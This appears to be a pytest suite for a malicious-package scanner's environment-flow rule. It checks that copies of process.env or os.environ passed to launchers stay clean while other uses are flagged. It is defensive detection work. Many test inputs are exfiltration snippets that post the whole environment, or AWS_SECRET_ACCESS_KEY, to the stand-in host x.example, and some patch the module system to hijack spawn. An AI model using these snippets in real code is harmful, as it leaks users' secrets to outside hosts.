"""Task 10c fix round 5 (Ruling R47): the binding exemption opts out on any doubt.

Every probe of the round-4 review (scratchpad rr4probe/v1-v8, harvested verbatim into
precision_10c_r5_probes.json) is pinned below by verdict. C1, I1-I5 and the URLSearchParams form are
non-clean; the real launchers (F0, F9*, P0, P4b, L0, L3, L4, PL0, E3, T1, T4, T5, T7, N12-a..f) and the
self-definition minors (M-a..M-k) stay clean. Still clean and outside R47 (pre-existing, report residuals):
L1c' (a single named key read, existing policy), P5 (an alias of os.environ copied later), D1 / PD1 (iterating the environment directly, no copy),
S-c (Object.assign over a spread array) and S-k (a JSX spread).

- R47 a (C1): a copy is bound only when every use is a launcher env slot. Writing or deleting single keys and
  truthiness tests are not uses; reading, iterating, Object.keys and Object.assign into another object are.
- R47 b: an "untrusted resolution" file binds nothing (envflow.untrusted_reason names why).
- R47 c: the returned_member (LazyPackage) rule is gone (R0-R5 non-clean).
- R47 d: f(**os.environ), new URLSearchParams(process.env), Object.entries(process.env) passed whole are copies.
- R47 e: a work budget; when it runs out nothing is bound and the file gets MED files.truncated.
- R47 f: TS `import cp = require(...)` resolves (T1), and so does `(<any>cp)` (T7, m2).
"""
from __future__ import annotations

import json
import time
from pathlib import Path

import pytest

from bawwab.scan.files import ScanFile
from bawwab.scan.rules import envflow, run_static_rules
from bawwab.severity import compute_verdict
from bawwab.types import Severity, Verdict

PROBES = {p["id"]: p for p in json.loads((Path(__file__).parent / "precision_10c_r5_probes.json").read_text())}
CODE = {"C": Verdict.CLEAN, "S": Verdict.SUSPICIOUS, "M": Verdict.MALICIOUS}

EXPECT = {
    'rr4/v1:F0': 'C',
    'rr4/v1:F0b': 'S',
    'rr4/v1:F1': 'S',
    'rr4/v1:F1b': 'S',
    'rr4/v1:F1c': 'S',
    'rr4/v1:F1d': 'S',
    'rr4/v1:F2': 'S',
    'rr4/v1:F2b': 'S',
    'rr4/v1:F3': 'S',
    'rr4/v1:F4': 'S',
    'rr4/v1:F5': 'S',
    'rr4/v1:F6': 'S',
    'rr4/v1:F7': 'S',
    'rr4/v1:F7b': 'S',
    'rr4/v1:F7c': 'S',
    'rr4/v1:F7d': 'S',
    'rr4/v1:F8': 'S',
    'rr4/v1:F9': 'C',
    'rr4/v1:F9b': 'S',
    'rr4/v1:F9c': 'S',
    'rr4/v1:F9d': 'C',
    'rr4/v1:F9e': 'S',
    'rr4/v1:F9f': 'S',
    'rr4/v1:F9g': 'C',
    'rr4/v1:F9h': 'C',
    'rr4/v1:F9i': 'C',
    'rr4/v1:F9j': 'S',
    'rr4/v1:F9k': 'S',
    'rr4/v1:F9l': 'S',
    'rr4/v1:F9m': 'S',
    'rr4/v2:P0': 'C',
    'rr4/v2:P0b': 'S',
    'rr4/v2:P1': 'S',
    'rr4/v2:P1b': 'S',
    'rr4/v2:P1c': 'S',
    'rr4/v2:P2': 'S',
    'rr4/v2:P3': 'S',
    'rr4/v2:P3b': 'S',
    'rr4/v2:P3c': 'S',
    'rr4/v2:P3d': 'S',
    'rr4/v2:P3e': 'S',
    'rr4/v2:P4': 'M',
    'rr4/v2:P4b': 'C',
    'rr4/v2:P5': 'C',
    'rr4/v2:P5b': 'M',
    'rr4/v2:P6': 'S',
    'rr4/v2:P7': 'S',
    'rr4/v2:P7b': 'S',
    'rr4/v2:P7c': 'S',
    'rr4/v2:P7d': 'S',
    'rr4/v2:P7e': 'S',
    'rr4/v2:P7f': 'S',
    'rr4/v2:P7g': 'S',
    'rr4/v2:P8': 'S',
    'rr4/v2:P8b': 'S',
    'rr4/v3:L0': 'C',
    'rr4/v3:L0b': 'S',
    'rr4/v3:L1': 'S',
    'rr4/v3:L1b': 'S',
    'rr4/v3:L1c': 'S',
    "rr4/v3:L1c'": 'C',
    'rr4/v3:L2': 'S',
    'rr4/v3:L2b': 'S',
    'rr4/v3:L2c': 'S',
    'rr4/v3:L3': 'C',
    'rr4/v3:L4': 'C',
    'rr4/v3:L4b': 'S',
    'rr4/v3:L5': 'S',
    'rr4/v3:PL0': 'C',
    'rr4/v3:PL1': 'S',
    'rr4/v3:PL1b': 'S',
    'rr4/v3:PL1c': 'S',
    'rr4/v3:PL1d': 'S',
    'rr4/v3b:D1': 'C',
    'rr4/v3b:D1b': 'S',
    'rr4/v3b:D1c': 'S',
    'rr4/v3b:D1d': 'S',
    'rr4/v3b:D1e': 'S',
    'rr4/v3b:PD1': 'C',
    'rr4/v3b:PD1b': 'S',
    'rr4/v3b:PL1e': 'S',
    'rr4/v4:E1': 'S',
    'rr4/v4:E2': 'S',
    'rr4/v4:E3#0': 'C',
    'rr4/v4:E4': 'S',
    'rr4/v4:E5': 'S',
    'rr4/v4:E6': 'S',
    'rr4/v4:E7': 'S',
    'rr4/v4:E8': 'S',
    'rr4/v4:E9': 'S',
    'rr4/v4:E10': 'S',
    'rr4/v4:E11': 'S',
    'rr4/v4:E12': 'S',
    'rr4/v4:E3#1': 'S',
    'rr4/v4:T1': 'C',
    'rr4/v4:T2': 'S',
    'rr4/v4:T2b': 'S',
    'rr4/v4:T3': 'S',
    'rr4/v4:T4': 'C',
    'rr4/v4:T5': 'C',
    'rr4/v4:T6': 'S',
    'rr4/v4:T7': 'C',
    'rr4/v4:T8': 'S',
    'rr4/v5:H1': 'S',
    'rr4/v5:H1b': 'S',
    'rr4/v5:H2': 'S',
    'rr4/v7:S-a': 'M',
    'rr4/v7:S-b': 'M',
    'rr4/v7:S-c': 'C',
    'rr4/v7:S-d': 'M',
    'rr4/v7:S-e': 'M',
    'rr4/v7:S-f': 'M',
    'rr4/v7:S-g': 'M',
    'rr4/v7:S-h': 'M',
    'rr4/v7:S-i': 'M',
    'rr4/v7:S-j': 'M',
    'rr4/v7:S-k': 'C',
    'rr4/v7:S-l': 'M',
    'rr4/v7:S-m': 'M',
    'rr4/v7:S-n': 'M',
    'rr4/v7:S-o': 'M',
    'rr4/v7:S-p': 'M',
    'rr4/v7:N12-a': 'C',
    'rr4/v7:N12-b': 'C',
    'rr4/v7:N12-c': 'C',
    'rr4/v7:N12-d': 'C',
    'rr4/v7:N12-e': 'C',
    'rr4/v7:N12-f': 'C',
    'rr4/v7:N12-g': 'M',
    'rr4/v7:X-a': 'S',
    'rr4/v7:X-b': 'S',
    'rr4/v7:X-c': 'S',
    'rr4/v7:X-d': 'S',
    'rr4/v7:X-e': 'S',
    'rr4/v7:M-a': 'C',
    'rr4/v7:M-b': 'C',
    'rr4/v7:M-c': 'C',
    'rr4/v7:M-d': 'C',
    'rr4/v7:M-e': 'C',
    'rr4/v7:M-f': 'C',
    'rr4/v7:M-g': 'C',
    'rr4/v7:M-h': 'C',
    'rr4/v7:M-i': 'C',
    'rr4/v7:M-j': 'C',
    'rr4/v7:M-k': 'C',
    'rr4/v7:M-l': 'M',
    'rr4/v7:M-m': 'M',
    'rr4/v8:R0': 'S',
    'rr4/v8:R1': 'S',
    'rr4/v8:R2': 'S',
    'rr4/v8:R3': 'S',
    'rr4/v8:R4': 'M',
    'rr4/v8:R5': 'S',
}

REAL = {"rr4/v1:F0", "rr4/v1:F9", "rr4/v1:F9d", "rr4/v1:F9g", "rr4/v1:F9h", "rr4/v1:F9i", "rr4/v2:P0", "rr4/v2:P4b",
        "rr4/v3:L0", "rr4/v3:L3", "rr4/v3:L4", "rr4/v3:PL0", "rr4/v4:E3#0", "rr4/v4:T1", "rr4/v4:T4", "rr4/v4:T5", "rr4/v4:T7"} | {
        f"rr4/v7:N12-{x}" for x in "abcdef"} | {f"rr4/v7:M-{x}" for x in "abcdefghijk"}
OUT_OF_SCOPE = {"rr4/v2:P5", "rr4/v3:L1c'", "rr4/v3b:D1", "rr4/v3b:PD1", "rr4/v7:S-c", "rr4/v7:S-k"}


def _found(files):
    return run_static_rules([ScanFile(r, s) for r, s in files])


def _verdict(files):
    return compute_verdict(_found(files))


def _rules(files):
    return {(f.rule, f.severity) for f in _found(files)}


def test_every_probe_has_an_expectation():
    assert set(EXPECT) == set(PROBES)


def test_only_real_launchers_and_out_of_scope_forms_are_clean():
    clean = {k for k, v in EXPECT.items() if v == "C"}
    assert clean == REAL | OUT_OF_SCOPE


@pytest.mark.parametrize("pid", sorted(PROBES))
def test_review_probe(pid):
    assert _verdict([tuple(f) for f in PROBES[pid]["files"]]) == CODE[EXPECT[pid]], PROBES[pid]["name"]


SEND = 'function send(d) { return fetch("https://x.example/c", { method: "POST", body: JSON.stringify(d) }); }\n'
PYSEND = 'import requests\ndef send(d):\n    requests.post("https://x.example/c", json=d)\n'
CP = 'const cp = require("child_process");\n'
GO = 'function go() { cp.spawn("ls", [], { env: { ...process.env } }); }\ngo();\n'
PYGO = 'import os, subprocess\ndef go():\n    subprocess.run(["ls"], env=os.environ.copy())\ngo()\n'


# ---------------------------------------------------------------- R47 a: C1, every use an env slot

@pytest.mark.parametrize("tail", [
    'for (const k in c) send(k + "=" + c[k]);',
    'Object.keys(c).forEach((k) => send(c[k]));',
    'const leak = {}; Object.assign(leak, c); send(leak);',
    'send(c.AWS_SECRET_ACCESS_KEY);',
    'send(c["AWS_SECRET_ACCESS_KEY"]);',
    'Object.entries(c).forEach(([k, v]) => send(v));',
    'send(String(c));',
    'c instanceof Object;',
])
def test_c1_a_bound_copy_used_any_other_way_is_not_bound(tail):
    src = CP + SEND + 'function go() { const c = { ...process.env }; cp.spawn("ls", [], { env: c }); ' + tail + ' }\ngo();\n'
    assert _verdict([("srv.js", src)]) != Verdict.CLEAN


@pytest.mark.parametrize("tail", [
    "for k in c:\n        send(c[k])",
    "send(c.get('AWS_SECRET_ACCESS_KEY'))",
    "send([c.pop(k) for k in list(c.keys())])",
    "send(dict(c.items()))",
    "send(list(c.values()))",
    "x = c.setdefault('A', '1')\n    send(x)",
])
def test_c1_python_bound_copy_used_any_other_way_is_not_bound(tail):
    src = 'import os, subprocess\n' + PYSEND + 'def go():\n    c = dict(os.environ)\n    subprocess.run(["ls"], env=c)\n    ' + tail + '\ngo()\n'
    assert _verdict([("srv.py", src)]) != Verdict.CLEAN


@pytest.mark.parametrize("body", [
    'const c = { ...process.env }; c.A = "1"; delete c.B; c["C"] = "2"; c.PATH = c.PATH + ":/opt/bin"; if (c) {} '
    'if (!c.X) {} cp.spawn("ls", [], { env: c });',
    'const e = Object.assign({}, process.env, { A: "1" }); cp.spawn("ls", [], { env: e });',
    'const opts = { env: { ...process.env }, cwd: "/" }; if (opts.cwd) {} opts.shell = true; cp.spawn("ls", [], opts);',
    'const c = typeof x === "undefined" ? { ...process.env } : null; if (c === null || c == null) return; cp.spawn("ls", [], { env: c });',
])
def test_c1_writes_and_tests_keep_a_real_launcher_bound(body):
    src = CP + 'const https = require("https");\nfunction go() { ' + body + ' }\ngo(); https.get("https://x.example/v");\n'
    assert not any(r == "credential-access" for r, _ in _rules([("srv.js", src)]))


def test_c1_python_writes_keep_soffice_bound():
    src = ('import os, subprocess, requests\ndef get_env():\n    env = os.environ.copy()\n    env["SAL_USE_VCLPLUGIN"] = "svp"\n'
           '    env["PATH"] = env["PATH"] + os.pathsep + "/opt"\n    env.pop("X", None)\n    env.update(A="1")\n    del env["Y"]\n'
           '    if "Z" in env:\n        pass\n    return env\ndef run(a):\n    return subprocess.run(["soffice"] + a, env=get_env())\n'
           'requests.get("https://x.example/v")\n')
    assert not any(r == "credential-access" for r, _ in _rules([("soffice.py", src)]))


def test_c1_options_read_of_env_is_not_bound():
    src = CP + SEND + 'function go() { const opts = { env: { ...process.env } }; cp.spawn("ls", [], opts); send(opts.env); }\ngo();\n'
    assert _verdict([("srv.js", src)]) != Verdict.CLEAN


def test_c1_proto_write_is_not_bound():
    src = CP + SEND + 'function go() { const c = { ...process.env }; c.__proto__ = { x: 1 }; cp.spawn("ls", [], { env: c }); }\ngo();\n'
    assert _verdict([("srv.js", src)]) != Verdict.CLEAN


# ---------------------------------------------------------------- R47 b: untrusted resolution

JS_TRIGGERS = [
    ("with statement", "srv.js", "with (o) { x(); }\n"),
    ("unicode escape in an identifier", "srv.js", "var \\u0063p2 = 1;\n"),
    ("HTML-like comment", "srv.js", "0 <!--b;\n"),
    ("HTML-like comment", "srv.js", "/*\n*/ --> trailing\n"),
    ("writes require", "srv.js", "require = ((r) => (m) => r(m))(require);\n"),
    ("writes require", "srv.js", "delete require.cache[k];\n"),
    ("writes arguments", "srv.js", "function f() { arguments[1] = 2; }\n"),
    ("writes module.constructor", "srv.js", "module.constructor.prototype.require = function () {};\n"),
    ("writes module.require", "srv.js", "module.require = function () {};\n"),
    ("writes Module", "srv.js", "Module.prototype.require = null;\n"),
    ("writes ._load", "srv.js", 'require("module")._load = function () {};\n'),
    ("writes ._resolveFilename", "srv.js", 'const M = require("module");\nM._resolveFilename = f;\n'),
    ("patches the module system", "srv.js", 'const M = require("module");\nObject.assign(M, { x: 1 });\n'),
    ("defines __importDefault", "srv.js", "const __importDefault = (m) => ({ default: m });\n"),
    ("defines __toESM", "srv.js", "var __toESM = (m) => m;\n"),
    ("defines __importStar", "srv.js", "function __importStar(m) { return m; }\n"),
    ("defines __require", "srv.js", 'var __require = ((x) => typeof require<"u" ? require : x)(0);\n'),
    ("defines require", "srv.js", "function require(m) { return {}; }\n"),
    ("defines createRequire", "srv.mjs", 'import { createRequire } from "./mine.js";\n'),
    ("defines __importDefault", "srv.mjs", 'import { __importDefault } from "./helpers.js";\n'),
    ("non-literal eval", "srv.js", 'eval("c" + "p = 1");\n'),
    ("non-literal Function", "srv.js", 'new Function("x", "c" + "p = x");\n'),
    ("non-literal Function", "srv.js", "Function(code)();\n"),
    ("eval as a value", "srv.js", "const e = eval;\n"),
    ("Function as a value", "srv.js", "const F = Function;\n"),
    ("non-literal constructor call", "srv.js", "[].constructor.constructor(code)();\n"),
    ("non-literal vm code", "srv.js", 'const vm = require("vm");\nvm.runInThisContext(code);\n'),
    ("block function cp redeclares an outer binding", "srv.js", "var cp = 1;\nfunction g() { { function cp() {} } }\n"),
    ("import type from child_process", "srv.ts", 'import type * as cp from "child_process";\n'),
    ("import type from child_process", "srv.ts", 'import { type spawn } from "child_process";\n'),
]


@pytest.mark.parametrize("why,rel,src", JS_TRIGGERS)
def test_untrusted_resolution_js_triggers(why, rel, src):
    assert envflow.untrusted_reason(rel, src) == why


PY_TRIGGERS = [
    ("defines importlib", "class importlib:\n    pass\n"),
    ("defines __import__", "def __import__(n):\n    pass\n"),
    ("defines import_module", "def import_module(n):\n    pass\n"),
    ("defines import_module", "from mylib import import_module\n"),
    ("defines importlib", "import mylib as importlib\n"),
    ("defines importlib", "importlib = None\n"),
    ("builtins.__import__", "import builtins\nbuiltins.__import__ = f\n"),
    ("writes builtins", "import builtins\nbuiltins.open = f\n"),
    ("uses __builtins__", '__builtins__["__import__"] = f\n'),
    ("sys.modules", 'import sys\nm = sys.modules\nm["subprocess"] = f\n'),
    ("imports sys.modules", "from sys import modules as M\n"),
    ("sys.modules", "import sys\nsys.modules |= {}\n"),
    ("sys.modules", 'import sys\nsys.modules.setdefault("subprocess", f)\n'),
    ("sys.modules", 'import sys\ndict.__setitem__(sys.modules, "subprocess", f)\n'),
    ("sys.modules", "import sys\nsys.modules.update(x=f)\n"),
    ("sys.modules", 'import sys\nsys.modules["subprocess"].run = f\n'),
    ("sys.meta_path", "import sys\nsys.meta_path.insert(0, F())\n"),
    ("sys.path_hooks", "import sys\nsys.path_hooks.append(F)\n"),
    ("sys used as a value", 'import sys\nsetattr(sys, "modules", {})\n'),
    ("non-literal exec", 'exec("sub" + "process = 1")\n'),
    ("non-literal eval", "eval(code)\n"),
    ("non-literal compile", 'compile(src, "f", "exec")\n'),
    ("exec as a value", "e = exec\n"),
    ("dynamic import", 'import importlib\nm = importlib.import_module(name)\n'),
    ("dynamic import", 'import importlib\nm = importlib.import_module("sys")\n'),
]


@pytest.mark.parametrize("why,src", PY_TRIGGERS)
def test_untrusted_resolution_python_triggers(why, src):
    assert envflow.untrusted_reason("srv.py", src) == why


@pytest.mark.parametrize("rel,src", [
    ("srv.js", '"use strict";\nvar __importDefault = (this && this.__importDefault) || function (mod) {\n'
               '    return (mod && mod.__esModule) ? mod : { "default": mod };\n};\n'),
    ("srv.mjs", 'import { createRequire } from "module";\nconst require = createRequire(import.meta.url);\n'),
    ("srv.mjs", 'import { createRequire } from "node:module";\n'),
    ("srv.js", 'const { __importDefault } = require("tslib");\n'),
    ("srv.js", 'eval("1 + 1"); new Function("return this")(); Function.prototype.apply.call(f, null, []);\n'),
    ("srv.js", "module.exports = { a: 1 }; exports.b = 2; this._extensions = []; x._load = 1;\n"),
    ("srv.js", '"use strict";\nvar cp = 1;\nfunction g() { { function cp() {} } }\n'),
    ("srv.js", "var cp = 1;\nfunction g() { function cp() {} }\n"),
    ("srv.js", "const s = 'with (o) <!-- \\\\u0063p -->'; // with (o) <!-- \\u0063\n"),
    ("srv.js", "for (let i = 9; i-->0;) {}\n"),
    ("srv.ts", 'import type { Foo } from "./types";\nimport { type Bar } from "lodash";\n'),
    ("srv.py", 'import importlib, sys, builtins, re\nm = importlib.import_module("json")\nif "x" in sys.modules:\n    pass\n'
               'print(sys.argv, builtins.open)\nre.compile(p)\neval("1")\n'),
    ("srv.py", "from re import compile\ncompile(p)\nfrom importlib import import_module\nimport_module('json')\n"),
])
def test_trusted_resolution_controls(rel, src):
    assert envflow.untrusted_reason(rel, src) == ""


def test_untrusted_file_binds_nothing_js():
    base = CP + 'const https = require("https");\n' + GO + 'https.get("https://x.example/v");\n'
    assert _verdict([("srv.js", base)]) == Verdict.CLEAN
    for _, rel, trig in JS_TRIGGERS:
        # a line-leading --> is blanked as a comment before the tree is read (as Node reads it): nothing to hide
        if rel == "srv.js" and "-->" not in trig:
            assert _verdict([("srv.js", base + trig)]) != Verdict.CLEAN, trig


def test_untrusted_file_binds_nothing_python():
    base = PYGO + 'import requests\nrequests.get("https://x.example/v")\n'
    assert _verdict([("srv.py", base)]) == Verdict.CLEAN
    for _, trig in PY_TRIGGERS:
        assert _verdict([("srv.py", base + trig)]) != Verdict.CLEAN, trig


def test_untrusted_file_keeps_spread_copies_with_no_network():
    # R46 b drops a spread copy in a file with no network; an untrusted file counts every copy (LOW)
    src = 'const x = { ...process.env };\nwith (o) {}\n'
    assert ("credential-access", Severity.LOW) in _rules([("srv.js", src)])


def test_debug_filter_in_untrusted_file_is_not_bound():
    # notion-mcp-server's bundled debug + express's depd: new Function(...) with built code (R47 b over R42 N5)
    debug = ('exports.inspectOpts = Object.keys(process.env).filter(key => /^debug_/i.test(key)).reduce((obj, key) => '
             '{ obj[key.substring(6)] = process.env[key]; return obj; }, {});\n')
    use = 'function useColors() { return "colors" in exports.inspectOpts ? Boolean(exports.inspectOpts.colors) : true; }\n'
    ok = 'const https = require("https");\n' + debug + use + 'https.get("https://x.example/v");\n'
    assert _verdict([("cli.js", ok)]) == Verdict.CLEAN
    bad = ok + 'var fn = new Function("fn", "return function (" + args + ") { return fn.apply(this, arguments) }");\n'
    assert _verdict([("cli.js", bad)]) != Verdict.CLEAN


def test_tsc_import_default_helper_keeps_cross_spawn_a_launcher():
    src = ('"use strict";\nvar __importDefault = (this && this.__importDefault) || function (mod) {\n'
           '    return (mod && mod.__esModule) ? mod : { "default": mod };\n};\n'
           'const cross_spawn_1 = __importDefault(require("cross-spawn"));\nconst https = require("https");\n'
           'function go() { (0, cross_spawn_1.default)("ls", [], { env: { ...process.env } }); }\n'
           'go(); https.get("https://x.example/v");\n')
    assert _verdict([("x.js", src)]) == Verdict.CLEAN
    spoof = src.replace('{ "default": mod }', '{ "default": { spawn: send } }')
    assert _verdict([("x.js", SEND + spoof)]) != Verdict.CLEAN


def test_interop_helper_imported_from_elsewhere_is_no_launcher():
    src = ('import { __importDefault } from "./h.js";\nconst cs = __importDefault(require("cross-spawn"));\n' + SEND
           + 'function go() { cs.default("ls", [], { env: { ...process.env } }); }\ngo();\n')
    assert _verdict([("x.mjs", src)]) != Verdict.CLEAN


# ---------------------------------------------------------------- R47 c: returned_member dropped

def test_lazy_package_loader_is_no_longer_resolved():
    real = ('import puppeteer from "puppeteer";\nclass LazyPackage { load() { return { puppeteer }; } }\nconst pkg = new LazyPackage();\n'
            + SEND + 'async function go() { const { puppeteer: p } = pkg.load(); await p.launch({ env: { ...process.env } }); }\ngo();\n')
    assert _verdict([("srv.mjs", real)]) != Verdict.CLEAN


# ---------------------------------------------------------------- R47 d: copy forms

@pytest.mark.parametrize("rel,src", [
    ("srv.py", 'import os, requests\ndef report(**d):\n    requests.post("https://x.example", json=d)\nreport(**os.environ)\n'),
    ("srv.py", 'import os, requests\nrequests.post("https://x.example", **os.environ)\n'),
    ("srv.py", 'import os, requests\nrequests.post("https://x.example", json=os.environ | {"a": "1"})\n'),
    ("srv.py", 'from os import *\nimport requests\nrequests.post("https://x.example", json={**environ})\n'),
    ("srv.py", 'import os, requests\nrequests.post("https://x.example", json=dict(getattr(os, "environ")))\n'),
    ("srv.js", 'fetch("https://x.example/c?" + new URLSearchParams(process.env));\n'),
    ("srv.js", 'const q = new URLSearchParams(process.env).toString();\nfetch("https://x.example/c?" + q);\n'),
    ("srv.js", 'fetch("https://x.example/c", { method: "POST", body: JSON.stringify(Object.entries(process.env)) });\n'),
    ("srv.js", 'fetch("https://x.example/c", { method: "POST", body: Reflect.ownKeys(process.env).join() });\n'),
    ("srv.js", 'const util = require("util");\nfetch("https://x.example/c", { method: "POST", body: util.inspect(process.env) });\n'),
])
def test_r47_d_copy_forms_are_flagged(rel, src):
    assert _verdict([(rel, src)]) != Verdict.CLEAN


def test_r47_d_launcher_kwargs_and_union_stay_bound():
    src = ('import os, subprocess, requests\ndef go():\n    subprocess.run(["ls"], env=os.environ | {"A": "1"})\n'
           'requests.get("https://x.example/v")\n')
    assert not any(r == "credential-access" for r, _ in _rules([("x.py", src)]))


def test_url_search_params_never_bound():
    src = CP + 'cp.spawn("ls", [], { env: new URLSearchParams(process.env) });\nfetch("https://x.example/v");\n'
    assert _verdict([("x.js", src)]) != Verdict.CLEAN


# ---------------------------------------------------------------- R47 e: work budget

def _k1(n, extra=""):
    return 'const cp=require("child_process");' + extra + "".join(
        f"function f{i}(e){{var e={{...process.env}};return e.A+e.B+e.C}}" for i in range(n))


def test_quadratic_k1_116kb_is_fast():
    # review r4 m3: 97 s inside envflow at 116 KB. The refs index makes it linear. With no network anywhere
    # nothing can leave, so R46 b keeps it clean; the same file with one fetch is suspicious.
    src = _k1(2000)
    assert len(src) > 115_000
    t0 = time.monotonic()
    assert _verdict([("b.js", src)]) == Verdict.CLEAN
    t1 = time.monotonic()
    assert _verdict([("b.js", _k1(2000, 'fetch("https://x.example/v");'))]) != Verdict.CLEAN
    assert t1 - t0 < 20 and time.monotonic() - t1 < 20


@pytest.mark.parametrize("src", [
    "".join(f"var o{i}={{get(){{return {{...process.env}}}}}};" for i in range(1200)) + "".join(f"o{i % 1200}.get();" for i in range(6000)),
    'const cp=require("child_process");' + "".join(f"let x{i}={{...process.env}};" for i in range(1500))
    + "".join(f'cp.spawn("a",[],{{env:x{i}}});' for i in range(1500)) + "var e;" + "e;" * 40000,
])
def test_budget_exceeded_fails_closed_fast(src):
    t0 = time.monotonic()
    found = _found([("b.js", src)])
    assert time.monotonic() - t0 < 30
    assert ("files.truncated", Severity.MED) in {(f.rule, f.severity) for f in found}
    assert compute_verdict(found) != Verdict.CLEAN


def test_budget_is_counted_in_steps():
    src = CP + 'const https = require("https");\n' + GO + 'https.get("https://x.example/v");\n'
    ok = envflow.env_copies("x.js", src, lambda *a: False)
    assert ok and ok[0].bound and not ok[0].budget
    over = envflow.env_copies("x.js", src, lambda *a: False, envflow._Budget(steps=5))
    assert over and not over[0].bound and over[0].budget and over[0].untrusted
    assert _verdict([("x.js", src)]) == Verdict.CLEAN


# ---------------------------------------------------------------- R47 f / m2: TS forms

@pytest.mark.parametrize("src", [
    'import cp = require("child_process");\nimport https = require("https");\n'
    'function go() { cp.spawn("ls", [], { env: { ...process.env } }); }\ngo(); https.get("https://x.example/v");\n',
    'import * as cp from "child_process";\nimport * as https from "https";\n'
    'function go() { (<any>cp).spawn("ls", [], { env: { ...process.env! } }); }\ngo(); https.get("https://x.example/v");\n',
])
def test_ts_import_equals_and_type_assertion_resolve(src):
    assert not any(r == "credential-access" for r, _ in _rules([("srv.ts", src)]))


def test_ts_import_equals_patched_is_no_launcher():
    src = ('import cp = require("child_process");\n' + SEND + '(cp as any).spawn = (c: any, a: any, o: any) => send(o.env);\n'
           'function go() { cp.spawn("ls", [], { env: { ...process.env } }); }\ngo();\n')
    assert _verdict([("srv.ts", src)]) != Verdict.CLEAN
